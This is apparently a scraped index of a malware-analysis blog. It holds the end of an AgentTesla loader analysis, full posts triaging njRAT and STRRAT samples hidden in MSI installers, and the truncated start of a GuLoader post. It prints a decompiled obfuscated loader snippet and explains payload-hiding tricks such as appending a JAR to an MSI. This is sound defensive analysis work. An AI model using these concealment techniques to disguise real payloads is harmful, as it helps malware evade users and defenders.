here:Stream? manifestResourceStream = typeof(\\u0002\\u200a\\u2000).Assembly.GetManifestResourceStream(&quot;289e8a8929dc4fc2616eefa4e3831722&quot;);byte[] array = new byte[128];if (8u != 0){ RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);}Stream stream = \\u0008\\u2006.\\u0002(manifestResourceStream, array, \\u0002());if (4u != 0){ \\u0005\\u200a\\u2000 = stream;}In the obfuscated .NET DLL it looks like the code is retrieving additional content from a .NET resource in the binary named 289e8a8929dc4fc2616eefa4e3831722 and working with it. During analysis I used this PowerShell code to extract the resource, but you can also use ILSpy or DNSpy.$teslaAssembly = [System.Reflection.Assembly]::LoadFile(&#39;/home/remnux/cases/tesla-rtf/reversed_try.png&#39;)$teslaManifestName = $teslaAssembly.GetManifestResourceNames()$teslaResourceStream = $teslaAssembly.GetManifestResourceStream(&#39;289e8a8929dc4fc2616eefa4e3831722&#39;)$resourceContents = [byte[]]::new([System.Convert]::ToInt32($teslaResourceStream.length))$teslaResourceStream.Read($resourceContents,0,[System.Convert]::ToInt32($teslaResourceStream.Length))Set-Content -Path 289e8a8929dc4fc2616eefa4e3831722 -Value $resourceContents -AsByteStreamThe contents of 289e8a8929dc4fc2616eefa4e3831722 are presumably XOR’d but I haven’t fully run that to ground yet.Adversary DecisionsI want to close out the post by pointing out a design decision in this threat that interests me a bit. The adversary used try.exe, compiled .NET code, to download and execute an additional .NET DLL. Several other threats in the wild also use this technique such as Yellow Cockatoo/Jupyter and GootLoader. It’s a relatively simple endeavor to write Invoke-WebRequest commands in PowerShell and call [System.Reflection.Assembly]::Load to load a byte array into memory. The adversary here decided to make this download via a non-obfuscated binary, making analysis really simple. They also ran the risk of application allowlisting running on the host. If allowlisting was present, they’d fail their objective and need to use PowerShell instead. However, doing so with PowerShell also opens up the adversary to risk by allowing PowerShell log analysis. All of these decisions have advantages and disadvantages.Thanks for reading and have a good week!" }, { "title": "njRAT Installed from a MSI", "url": "/njrat-installed-from-msi/", "categories": "malware", "tags": "malware, njrat, msi, oledump", "date": "2022-02-03 00:00:00 +0000", "snippet": "In my last post I walked through the analysis of an unusual MSI file that an adversary had tacked a STRRAT Java ARchive file to the end of the MSI contents. In this post, I want to walk through a more normal MSI sample that an adversary designed to delivery njRAT. If you want to follow along at home, the sample I’m working with is in MalwareBazaar here: https://bazaar.abuse.ch/sample/1f95063441e9d231e0e2b15365a8722c5136c2a6fe2716f3653c260093026354/.Triaging the FileAs usual, let’s get started triaging with file and diec.remnux@remnux:~/cases/njrat-msi$ file mal.msi mal.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 1252, Title: Microsoft Visual Studio - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com 16.6.255.35071, Subject: Microsoft Visual Studio - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com, Author: Microsoft Corporation, Keywords: Installer, Template: x64;1033, Revision Number: {49C681E5-45C4-4467-92EE-456F1E355C5F}, Create Time/Date: Sun Feb 7 22:37:14 2021, Last Saved Time/Date: Sun Feb 7 22:37:14 2021, Number of Pages: 200, Number of Words: 2, Name of Creating Application: MSI Wrapper (10.0.50.0), Security: 2remnux@remnux:~/cases/njrat-msi$ diec mal.msi filetype: Binaryarch: NOEXECmode: Unknownendianess: LEtype: Unknown installer: Microsoft Installer(MSI)From the output it looks like the sample indeed has the magic bytes for a MSI. From the file output, it looks like the adversary may have used an unlicensed MSI Wrapper tool from “exemsi[.]com”. This is pretty common, there are multiple free and paid tools to create MSI files and I’ve seen samples where adversaries would essentially download trials from multiple vendors and switch vendors between campaigns. Let’s dive into the MSI contents!Analyzing the MSI ContentsJust like in the last post, we can use oledump.py to view the content streams within this MSI.remnux@remnux:~/cases/njrat-msi$ oledump.py mal.msi 1: 136 &#39;\\x05DocumentSummaryInformation&#39; 2: 588 &#39;\\x05SummaryInformation&#39; 3: 669935 &#39;䌋䄱䜵䅾䞽䕠䓤䈳㼧䗨䓸䕙䊲䄵䠰&#39; 4: 212992 &#39;䌋䄱䜵䅾䞽䘌䗶䐲䆊䌷䑲䏍䠯&#39; 5: 672 &#39;䡀㬿䏲䐸䖱&#39; 6: 8555 &#39;䡀㼿䕷䑬㭪䗤䠤&#39; 7: 1216 &#39;䡀㼿䕷䑬㹪䒲䠯&#39; 8: 38 &#39;䡀㽿䅤䈯䠶&#39; 9: 2064 &#39;䡀㿿䏤䇬䗤䒬䠱&#39; 10: 4 &#39;䡀䄕䑸䋦䒌䇱䗬䒬䠱&#39; 11: 48 &#39;䡀䇊䌰㮱䈻䘦䈷䈜䘴䑨䈦&#39; 12: 24 &#39;䡀䇊䌰㾱㼒䔨䈸䆱䠨&#39; 13: 42 &#39;䡀䇊䗹䛎䆨䗸㼨䔨䈸䆱䠨&#39; 14: 4 &#39;䡀䈏䗤䕸㬨䐲䒳䈱䗱䠶&#39; 15: 16 &#39;䡀䈏䗤䕸䠨&#39; 16: 14 &#39;䡀䈖䌧䠤&#39; 17: 60 &#39;䡀䈛䌪䗶䜵&#39; 18: 8 &#39;䡀䌋䄱䜵&#39; 19: 18 &#39;䡀䌍䈵䗦䕲䠼&#39; 20: 216 &#39;䡀䑒䗶䏤㮯䈻䘦䈷䈜䘴䑨䈦&#39; 21: 48 &#39;䡀䑒䗶䏤㾯㼒䔨䈸䆱䠨&#39; 22: 12 &#39;䡀䒌䓰䑲䑨䠷&#39; 23: 32 &#39;䡀䓞䕪䇤䠨&#39; 24: 80 &#39;䡀䕙䓲䕨䜷&#39; 25: 180 &#39;䡀䘌䗶䐲䆊䌷䑲&#39;Don’t worry about the stream names being unreadable, that’s a common thing in the MSI files I’ve seen. We want to focus on the first two columns. The left column is the stream number and the middle is the size of the stream contents in bytes. We want to analyze the largest streams to the smallest until we start finding streams with no workable data. In this sample, we want to work with streams 3, 4, 6, 7, and 9.remnux@remnux:~/cases/njrat-msi$ oledump.py -a -s 3 mal.msi | head00000000: 4D 53 43 46 00 00 00 00 EF 38 0A 00 00 00 00 00 MSCF.....8......00000010: 2C 00 00 00 00 00 00 00 03 01 01 00 01 00 00 00 ,...............00000020: 9B 8E 00 00 47 00 00 00 15 00 00 00 00 38 0A 00 ....G........8..00000030: 00 00 00 00 00 00 3C 54 57 80 20 00 73 65 72 76 ......&amp;lt;TW. .serv00000040: 65 72 2E 65 78 65 00 99 0A 33 F0 00 80 00 80 4D er.exe...3.....M00000050: 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 Z...............00000060: 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 .......@........00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000080: 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0E ................00000090: 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 .......!..L.!ThiIn stream 3 we can see the first bytes of content contain the ASCII characters MSCF. This is consistent with Cabinet Archive (CAB) files. We can dump out the stream and confirm this with file.remnux@remnux:~/cases/njrat-msi$ oledump.py -d -s 3 mal.msi &amp;gt; 3.datremnux@remnux:~/cases/njrat-msi$ file 3.dat 3.dat: Microsoft Cabinet archive data, Windows 2000/XP setup, 669935 bytes, 1 file, at 0x2c +A &quot;server.exe&quot;, ID 36507, number 1, 21 datablocks, 0x0 compressionSure enough, it looks like we’ve dumped out a CAB file. We’ll get to that in a bit. Let’s finish looking through the other streams.remnux@remnux:~/cases/njrat-msi$ oledump.py -a -s 4 mal.msi | head00000000: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 MZ..............00000010: B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@.......00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000030: 00 00 00 00 00 00 00 00 00 00 00 00 F0 00 00 00 ................00000040: 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 ........!..L.!Th00000050: 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F is program canno00000060: 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 t be run in DOS 00000070: 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 mode....$.......00000080: FE AE 1E EC BA CF 70 BF BA CF 70 BF BA CF 70 BF ......p...p...p.00000090: B3 B7 F4 BF FA CF 70 BF B3 B7 E5 BF AF CF 70 BF ......p.......p.Stream 4 looks like it contains some executable data with a MZ header and DOS stub. We can dump that out and continue.remnux@remnux:~/cases/njrat-msi$ oledump.py -a -s 6 mal.msi | head00000000: 4E 61 6D 65 54 61 62 6C 65 54 79 70 65 43 6F 6C NameTableTypeCol00000010: 75 6D 6E 5F 56 61 6C 69 64 61 74 69 6F 6E 56 61 umn_ValidationVa00000020: 6C 75 65 4E 50 72 6F 70 65 72 74 79 49 64 5F 53 lueNPropertyId_S00000030: 75 6D 6D 61 72 79 49 6E 66 6F 72 6D 61 74 69 6F ummaryInformatio00000040: 6E 44 65 73 63 72 69 70 74 69 6F 6E 53 65 74 43 nDescriptionSetC00000050: 61 74 65 67 6F 72 79 4B 65 79 43 6F 6C 75 6D 6E ategoryKeyColumn00000060: 4D 61 78 56 61 6C 75 65 4E 75 6C 6C 61 62 6C 65 MaxValueNullable00000070: 4B 65 79 54 61 62 6C 65 4D 69 6E 56 61 6C 75 65 KeyTableMinValue00000080: 49 64 65 6E 74 69 66 69 65 72 4E 61 6D 65 20 6F IdentifierName o00000090: 66 20 74 61 62 6C 65 4E 61 6D 65 20 6F 66 20 63 f tableName of cremnux@remnux:~/cases/njrat-msi$ oledump.py -a -s 7 mal.msi | head00000000: 00 00 00 00 04 00 06 00 05 00 02 00 00 00 00 00 ................00000010: 04 00 02 00 06 00 02 00 0B 00 15 00 05 00 05 00 ................00000020: 01 00 2C 00 0A 00 01 00 13 00 02 00 0B 00 06 00 ..,.............00000030: 03 00 02 00 08 00 02 00 09 00 02 00 08 00 02 00 ................00000040: 08 00 02 00 08 00 02 00 08 00 02 00 0A 00 19 00 ................00000050: 0D 00 01 00 0E 00 01 00 03 00 01 00 1E 00 01 00 ................00000060: 01 00 2A 00 15 00 01 00 15 00 01 00 36 00 01 00 ..*.........6...00000070: 24 00 01 00 F5 00 01 00 0F 00 01 00 04 00 09 00 $...............00000080: 20 00 01 00 15 00 01 00 14 00 07 00 06 00 0C 00 ...............00000090: 42 00 05 00 09 00 15 00 9F 00 05 00 08 00 0C 00 B...............remnux@remnux:~/cases/njrat-msi$ oledump.py -a -s 9 mal.msi | head00000000: 06 00 06 00 06 00 06 00 06 00 06 00 06 00 06 00 ................00000010: 06 00 06 00 0A 00 0A 00 22 00 22 00 22 00 29 00 ........&quot;.&quot;.&quot;.).00000020: 29 00 29 00 2A 00 2A 00 2A 00 2B 00 2B 00 2F 00 ).).*.*.*.+.+./.00000030: 2F 00 2F 00 2F 00 2F 00 2F 00 35 00 35 00 35 00 /././././.5.5.5.00000040: 3D 00 3D 00 3D 00 3D 00 3D 00 4D 00 4D 00 4D 00 =.=.=.=.=.M.M.M.00000050: 4D 00 4D 00 4D 00 4D 00 4D 00 5C 00 5C 00 61 00 M.M.M.M.M.\\.\\.a.00000060: 61 00 61 00 61 00 61 00 61 00 61 00 61 00 6F 00 a.a.a.a.a.a.a.o.00000070: 6F 00 72 00 72 00 72 00 73 00 73 00 73 00 74 00 o.r.r.r.s.s.s.t.00000080: 74 00 77 00 77 00 77 00 77 00 77 00 77 00 82 00 t.w.w.w.w.w.w...00000090: 82 00 86 00 86 00 86 00 86 00 86 00 86 00 90 00 ................Streams 6, 7, and 9 have either some string data or not much recognizable contents. If we start running into issues, dumping stream 6 might be a decent idea to see if there are scripting commands within, but that’s not necessary right now.Extracting the CAB FileExtracting the contents of the CAB is really easy. Just use 7z. Extracting the contents unpacks server.exe, which appears to be a .NET binary.remnux@remnux:~/cases/njrat-msi$ 7z x 3.datExtracting archive: 3.dat-- Path = 3.datType = CabPhysical Size = 669935Method = NoneBlocks = 1Volumes = 1Volume Index = 0ID = 36507Everything is Ok Size: 669696Compressed: 669935remnux@remnux:~/cases/njrat-msi$ file server.exe server.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windowsremnux@remnux:~/cases/njrat-msi$ diec server.exe filetype: PE32arch: I386mode: 32-bitendianess: LEtype: GUI library: .NET(v4.0.30319)[-] compiler: VB.NET(-)[-] linker: Microsoft Linker(48.0)[GUI32]The final step for this branch of analysis will be to decompile the .NET malware to its source. For this, I like to use ilspycmd.remnux@remnux:~/cases/njrat-msi$ ilspycmd server.exe &amp;gt; server.decompiled.cs remnux@remnux:~/cases/njrat-msi$ head server.decompiled.cs using System;using System.CodeDom.Compiler;using System.Collections.Generic;using System.ComponentModel;using System.Configuration;using System.Diagnostics;using System.Drawing;using System.Globalization;using System.IO;using System.Linq;Sure enough, it looks like we got some readable C# code!What about that other EXE/DLL?The other DLL we pulled from stream 4 might still be relevant, so let’s look into it. We can get a pretty good idea of the DLL’s functionality using a combination of pedump and strings from floss.remnux@remnux:~/cases/njrat-msi$ pedump --exports 4.dat === EXPORTS ===# module &quot;MsiCustomActions.dll&quot;# flags=0x0 ts=&quot;2021-02-07 22:37:10&quot; version=0.0 ord_base=1# nFuncs=10 nNames=10 ORD ENTRY_VA NAME 1 a5d0 _CheckReboot@4 2 a510 _InstallFinish1@4 3 a740 _InstallFinish2@4 4 a9d0 _InstallMain@4 5 a4a0 _InstallPrepare@4 6 abc0 _InstallRollback@4 7 ac80 _SubstWrappedArguments@4 8 b280 _UninstallFinish1@4 9 b6e0 _UninstallFinish2@4 a ac90 _UninstallPrepare@4The exported functions in the DLL look like they might be related to generic installation activity. In addition, the DLL thinks it has a module name of MsiCustomActions.dll. Nothing really stands out as suspicious, let’s take a look at output from floss that has been ranked with stringsifter.remnux@remnux:~/cases/njrat-msi$ floss -q 4.dat | rank_strings &amp;gt; ranked_floss.txt remnux@remnux:~/cases/njrat-msi$ less ranked_floss.txtfiles.cabC:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb- UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.comSOFTWARE\\EXEMSI.COM\\MSI Wrapper-R files.cab -F:* filesmsiwrapper.inicmd.exeSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UninstallSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\msi.dllError setting security.Remove cabinet fileQuietUninstallString isUninstallString isProtection failed.Removal of protection failed.Focus isSELECT `Data` FROM `Binary` WHERE `Name` = &#39;%s&#39;ShellExecuteEx failed (%d).Error setting security. Exit code %d....There are loads of strings in this binary that seem consistent with being an installation component. The debugging PDB file is named with a MSI-related path. The vendor of the MSI Wrapper is mentioned in the DLL as well. It would be nice if the binary was signed, but we can’t always get what we want.Wrapping up, if you want to dive deeper into that njRAT server.exe process, start with the decompiled code output from ilspycmd and have fun. Thanks for reading!" }, { "title": "STRRAT Attached to a MSI File", "url": "/strrat-attached-to-msi/", "categories": "malware", "tags": "malware, strrat, msi, oledump, java, jar", "date": "2022-02-02 00:00:00 +0000", "snippet": "Adversaries can get really creative with ways to hide and execute payloads. In this post I’ll cover one instance where an adversary appended STRRAT to a MSI file to make it look legitimate during analysis. If you want to follow along at home, the sample I’m working with is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/0c3ff324e87c65c09f862f426d137206b5e895e70a85e6831a4aa5cc808a80be/.Triaging the FileMalwareBazaar says the sample is a MSI file, so let’s verify that claim using file, diec, and xxd.remnux@remnux:~/cases/unk-msi$ file delivery.msi delivery.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, MSI Installer, Code page: 1252, Title: Installation Database, Subject: REPLACE, Author: REPLACE, Keywords: Installer, Comments: This installer database contains the logic and data required to install REPLACE., Template: Intel;1033, Revision Number: {00000000-0000-0000-0000-000000000000}, Number of Pages: 200, Number of Words: 0, Security: 4, Create Time/Date: Wed Nov 23 16:25:04 2016, Last Saved Time/Date: Wed Nov 23 16:25:04 2016, Name of Creating Application: Windows Installer XML v2.0.3719.0 (candle/light)remnux@remnux:~/cases/unk-msi$ diec delivery.msi filetype: Binaryarch: NOEXECmode: Unknownendianess: LEtype: Unknown installer: Microsoft Installer(MSI)remnux@remnux:~/cases/unk-msi$ xxd -C delivery.msi | head00000000: d0cf 11e0 a1b1 1ae1 0000 0000 0000 0000 ................00000010: 0000 0000 0000 0000 3e00 0400 feff 0c00 ........&amp;gt;.......00000020: 0600 0000 0000 0000 0100 0000 0100 0000 ................00000030: 0100 0000 0000 0000 0010 0000 0200 0000 ................00000040: 0100 0000 feff ffff 0000 0000 0000 0000 ................00000050: ffff ffff ffff ffff ffff ffff ffff ffff ................00000060: ffff ffff ffff ffff ffff ffff ffff ffff ................00000070: ffff ffff ffff ffff ffff ffff ffff ffff ................00000080: ffff ffff ffff ffff ffff ffff ffff ffff ................00000090: ffff ffff ffff ffff ffff ffff ffff ffff ................All of our checks conclude that the file indeed has magic bytes for a MSI installer file. We can also take a look at the file size using ls or exiftool.remnux@remnux:~/cases/unk-msi$ ls -lh delivery.msi -rw-r--r-- 1 remnux remnux 658K Feb 3 2022 delivery.msiSo the MSI file is about 658K in size. It’s a decent enough size to have some executable content within, so let’s tear into it.Analyzing the MSI FileMSI files are structurally similar to MS Office 97-2003 documents. In fact, that’s why the file command returns Composite Document File V2 Document for MSI files as they share the same magic bytes with documents. This is good news because it means we can use oledump.py to view and extract content from streams within the MSI file.remnux@remnux:~/cases/unk-msi$ oledump.py delivery.msi 1: 528 &#39;\\x05SummaryInformation&#39; 2: 784 &#39;䡀㬿䏲䐸䖱&#39; 3: 8553 &#39;䡀㼿䕷䑬㭪䗤䠤&#39; 4: 1100 &#39;䡀㼿䕷䑬㹪䒲䠯&#39; 5: 36 &#39;䡀㽿䅤䈯䠶&#39; 6: 2400 &#39;䡀㿿䏤䇬䗤䒬䠱&#39; 7: 48 &#39;䡀䇊䌰㮱䈻䘦䈷䈜䘴䑨䈦&#39; 8: 24 &#39;䡀䇊䌰㾱㼒䔨䈸䆱䠨&#39; 9: 48 &#39;䡀䇊䗹䛎䆨䗸㼨䔨䈸䆱䠨&#39; 10: 20 &#39;䡀䈏䗤䕸㬨䐲䒳䈱䗱䠶&#39; 11: 48 &#39;䡀䈏䗤䕸䠨&#39; 12: 14 &#39;䡀䈖䌧䠤&#39; 13: 132 &#39;䡀䈛䌪䗶䜵&#39; 14: 64 &#39;䡀䋜䕲䆷䗸&#39; 15: 30 &#39;䡀䌍䈵䗦䕲䠼&#39; 16: 20 &#39;䡀䌏䈯&#39; 17: 132 &#39;䡀䑒䗶䏤㮯䈻䘦䈷䈜䘴䑨䈦&#39; 18: 42 &#39;䡀䑒䗶䏤㾯㼒䔨䈸䆱䠨&#39; 19: 12 &#39;䡀䒌䇱䗬䒬䠱&#39; 20: 60 &#39;䡀䒌䓰䑲䑨䠷&#39; 21: 16 &#39;䡀䓞䕪䇤䠨&#39; 22: 56 &#39;䡀䕙䓲䕨䜷&#39; 23: 20 &#39;䡀䖖㯬䏬㱨䖤䠫&#39;Within the oledump.py output, you can ignore the stream names. After working with numerous MSI files in oledump I’ve found that having unreadable stream names is fairly common. Instead, let’s focus on the first two columns. The left column is a stream number and the middle is a size value in bytes. From here, we can inspect the individual streams using oledump. To do this, work from the stream with the largest size value downward until you start encountering empty-ish streams. In this sample, we want to inspect streams 3, 6, 4, and 2. Stream 1 should always contain summary information about the MSI file.remnux@remnux:~/cases/unk-msi$ oledump.py -a -s 3 delivery.msi | head00000000: 4E 61 6D 65 54 61 62 6C 65 46 65 61 74 75 72 65 NameTableFeature00000010: 46 65 61 74 75 72 65 5F 50 61 72 65 6E 74 54 69 Feature_ParentTi00000020: 74 6C 65 44 65 73 63 72 69 70 74 69 6F 6E 44 69 tleDescriptionDi00000030: 73 70 6C 61 79 4C 65 76 65 6C 44 69 72 65 63 74 splayLevelDirect00000040: 6F 72 79 5F 41 74 74 72 69 62 75 74 65 73 41 70 ory_AttributesAp00000050: 70 6C 69 63 61 74 69 6F 6E 44 65 73 6B 74 6F 70 plicationDesktop00000060: 53 68 6F 72 74 63 75 74 50 72 6F 67 72 61 6D 53 ShortcutProgramS00000070: 68 6F 72 74 63 75 74 55 70 67 72 61 64 65 43 6F hortcutUpgradeCo00000080: 64 65 55 70 67 72 61 64 65 4B 65 79 52 6F 6F 74 deUpgradeKeyRoot00000090: 52 65 67 69 73 74 72 79 44 45 4C 45 54 45 5F 54 RegistryDELETE_TIn stream 3 we can observe string values that might be related to a configuration file or something else related to the installation process. Since this is our largest stream, this is already a bit problematic. If the installer contains EXE binary content, the binary will likely be larger than a text file. After dumping out this stream with oledump.py -d we can look at the contents and see that it doesn’t contain any scripting commands either. This dumping process is easier to do than show in a post, so I’ll leave that for a reader exercise :).Where’s the Malware???After checking out the remaining large streams we can’t find executable content in the MSI.remnux@remnux:~/cases/unk-msi$ oledump.py -a -s 6 delivery.msi | head00000000: 05 00 05 00 05 00 05 00 05 00 05 00 05 00 05 00 ................00000010: 11 00 11 00 11 00 11 00 11 00 11 00 11 00 14 00 ................00000020: 14 00 14 00 14 00 14 00 14 00 3D 00 3D 00 3D 00 ..........=.=.=.00000030: 3D 00 3D 00 3D 00 44 00 44 00 44 00 50 00 50 00 =.=.=.D.D.D.P.P.00000040: 50 00 50 00 50 00 50 00 50 00 50 00 50 00 50 00 P.P.P.P.P.P.P.P.00000050: 50 00 50 00 50 00 50 00 50 00 50 00 60 00 60 00 P.P.P.P.P.P.`.`.00000060: 60 00 60 00 60 00 60 00 68 00 68 00 68 00 6A 00 `.`.`.`.h.h.h.j.00000070: 6A 00 6A 00 73 00 73 00 73 00 87 00 87 00 87 00 j.j.s.s.s.......00000080: 88 00 88 00 88 00 8A 00 8A 00 8C 00 8C 00 8C 00 ................00000090: 8C 00 8C 00 8C 00 8C 00 8C 00 90 00 90 00 90 00 ................remnux@remnux:~/cases/unk-msi$ oledump.py -a -s 4 delivery.msi | head00000000: E9 FD 00 00 04 00 04 00 05 00 02 00 00 00 00 00 ................00000010: 00 00 00 00 07 00 16 00 0E 00 02 00 05 00 02 00 ................00000020: 0B 00 06 00 07 00 02 00 05 00 04 00 0A 00 06 00 ................00000030: 0A 00 08 00 0B 00 04 00 0F 00 03 00 0F 00 03 00 ................00000040: 0B 00 03 00 07 00 0F 00 03 00 02 00 04 00 02 00 ................00000050: 08 00 0F 00 0F 00 01 00 26 00 07 00 0E 00 02 00 ........&amp;amp;.......00000060: 06 00 02 00 08 00 06 00 0A 00 02 00 0A 00 02 00 ................00000070: 05 00 05 00 0A 00 08 00 0E 00 01 00 07 00 16 00 ................00000080: 0B 00 01 00 0B 00 03 00 0C 00 0C 00 0E 00 01 00 ................00000090: 0B 00 01 00 11 00 01 00 0E 00 01 00 0F 00 01 00 ................remnux@remnux:~/cases/unk-msi$ oledump.py -a -s 2 delivery.msi | head00000000: 05 00 05 00 05 00 05 00 05 00 05 00 05 00 05 00 ................00000010: 11 00 11 00 11 00 11 00 11 00 11 00 11 00 14 00 ................00000020: 14 00 14 00 14 00 14 00 14 00 3D 00 3D 00 3D 00 ..........=.=.=.00000030: 3D 00 3D 00 3D 00 44 00 44 00 44 00 50 00 50 00 =.=.=.D.D.D.P.P.00000040: 50 00 50 00 50 00 50 00 50 00 50 00 50 00 50 00 P.P.P.P.P.P.P.P.00000050: 50 00 50 00 50 00 50 00 50 00 50 00 60 00 60 00 P.P.P.P.P.P.`.`.00000060: 60 00 60 00 60 00 60 00 68 00 68 00 68 00 6A 00 `.`.`.`.h.h.h.j.00000070: 6A 00 6A 00 73 00 73 00 73 00 87 00 87 00 87 00 j.j.s.s.s.......00000080: 88 00 88 00 88 00 8A 00 8A 00 8C 00 8C 00 8C 00 ................00000090: 8C 00 8C 00 8C 00 8C 00 8C 00 90 00 90 00 90 00 ................Clearly there is some form of content here otherwise AV vendors wouldn’t call the file malicious. Also, if we go back and look at the oledump output we can see the stream sizes, when summed up, fall significantly short of 658K. In situations like this I prefer to use xxd and less combined to browse the hex and ASCII side-by-side to look for patterns.remnux@remnux:~/cases/unk-msi$ xxd -C delivery.msi | less...00027600: 4d5a 9000 0300 0000 0400 0000 ffff 0000 MZ..............00027610: b800 0000 0000 0000 4000 0000 0000 0000 ........@.......00027620: 0000 0000 0000 0000 0000 0000 0000 0000 ................00027630: 0000 0000 0000 0000 0000 0000 0001 0000 ................00027640: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468 ........!..L.!Th00027650: 6973 2070 726f 6772 616d 2063 616e 6e6f is program canno00027660: 7420 6265 2072 756e 2069 6e20 444f 5320 t be run in DOS 00027670: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000 mode....$.......00027680: 532f 81a2 174e eff1 174e eff1 174e eff1 S/...N...N...N.....Using the search feature of less and the string “MZ” we found some executable content. We can try to unpack that in a minute after we get done browsing the bytes. Once we get toward the end of the MSI file we can see some more interesting strings.000a4540: 6c61 7373 504b 0102 1400 1400 0808 0800 lassPK..........000a4550: 8719 3f54 59cb 777b a40a 0000 ca11 0000 ..?TY.w{........000a4560: 1800 0000 0000 0000 0000 0000 0000 fd40 ...............@000a4570: 0100 6361 724c 616d 626f 2f64 6668 6466 ..carLambo/dfhdf000a4580: 6e64 6667 2e63 6c61 7373 504b 0102 1400 ndfg.classPK....000a4590: 1400 0808 0800 8719 3f54 3ceb b0cc 3704 ........?T&amp;lt;...7.000a45a0: 0000 4b07 0000 1600 0000 0000 0000 0000 ..K.............000a45b0: 0000 0000 e74b 0100 6361 724c 616d 626f .....K..carLambo000a45c0: 2f78 6276 6378 6e78 2e63 6c61 7373 504b /xbvcxnx.classPK000a45d0: 0506 0000 0000 4100 4100 6c11 0000 6250 ......A.A.l...bPIn the strings we can see some references to “carLambo” and “.class” files. These are significant findings because “.class” files are Java bytecode files. We can hypothesize that there is likely Java executable content attached to this MSI file. This sort of thing has happened before, in fact there was a bit of a hubbub back in 2019 when VirusTotal talked about it in a blog post. I also published one then, doing a bit of tinkering.Long story short, you can append Java Archive (JAR) files to MSI files without hindering the operation of either file type. Java reads the JAR from end to front and msiexec reads from front to end. In fact, we can rename the MSI file to delivery.jar and view the Java contents using JD-GUI in REMnux.Extracting the Java Class FilesAs an alternate path to extract the Java class files, you can also use binwalk.remnux@remnux:~/cases/unk-msi$ binwalk -e delivery.msi DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------...85504 0x14E00 Microsoft executable, portable (PE)...161280 0x27600 Microsoft executable, portable (PE)...658644 0xA0CD4 Zip archive data, at least v2.0 to extract, name: carLambo/dhgfgh.class661635 0xA1883 Zip archive data, at least v2.0 to extract, name: carLambo/ngdnbn.class664267 0xA22CB Zip archive data, at least v2.0 to extract, name: carLambo/xbxcv.class664829 0xA24FD Zip archive data, at least v2.0 to extract, name: carLambo/dfhdfndfg.class667623 0xA2FE7 Zip archive data, at least v2.0 to extract, name: carLambo/xbvcxnx.class673230 0xA45CE End of Zip archive, footer length: 22By taking this approach the binwalk tool also extracts the relevant EXE files.remnux@remnux:~/cases/unk-msi/_delivery.msi.extracted$ lltotal 220drwxrwxr-x 4 remnux remnux 4096 Feb 2 22:25 ./drwxrwxr-x 3 remnux remnux 4096 Feb 2 22:25 ../-rw-rw-r-- 1 remnux remnux 5120 Apr 7 2014 _75C053BA9648745475BB4EE6B8141822-rw-rw-r-- 1 remnux remnux 96740 Feb 2 22:25 8CC00.cab-rw-rw-r-- 1 remnux remnux 90596 Feb 2 22:25 8E400.zipdrwxrwxr-x 3 remnux remnux 4096 Feb 2 22:28 carLambo/-rw-rw-r-- 1 remnux remnux 4662 Apr 7 2014 _CFADD94CF3B345E684381C7F3A1EEE82drwxrwxr-x 2 remnux remnux 4096 Feb 2 22:28 META-INF/From here we can work with the extracted files as we please! The executable content in _75C053BA9648745475BB4EE6B8141822 isn’t malicious and seems to just be part of the MSI “background noise” here. Under the carLambo folder we can browse and decompile class files as desired using JD-GUI, cfr, or another tool.remnux@remnux:~/cases/unk-msi/_delivery.msi.extracted/carLambo$ cfr Main.class | head/* * Decompiled with CFR 0.149. */package carLambo;import carLambo.dhgfgh;import carLambo.dndghd;import carLambo.fgssdg;import carLambo.sbsbgsrg;import carLambo.sdfsldf;How do we know it’s STRRAT??Alright, the first piece of evidence that this malware is STRRAT is that the entire Java package inside the JAR file is named “carLambo”. Googling &quot;carLambo&quot; java gives you loads of sandbox reports and some analysis reports pointing to STRRAT.The next piece of evidence is the structure of the JAR file. There is a resources/config.txt file. This is consistent with STRRAT. In addition, despite other classes being obfuscated, there are deobfuscated classes referring to Windows USER32, WinGDI, Kernel32, and HBrowserNativeApis keywords. These are also consistent with STRRAT based on documentation from Jai Minton.Alright, that’s where I end tonight so I can go to bed. Hopefully in the next few days I’ll put together another post on analyzing this STRRAT sample some more so we can get its C2 address and such. Thanks for reading!" }, { "title": "GuLoader Executing Shellcode Using Callback Functions", "url": "/guloader-executing-shellcode-callbacks/", "categories": "malware", "tags": "malware, guloader, shellcode, callbacks", "date": "2022-01-27 00:00:00 +0000", "snippet": "I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/Triaging the First StageFor the first stage, MalwareBazaar says its a VBScript file, so we’ve already got a decent hypothesis on the file type. We can go ahead and 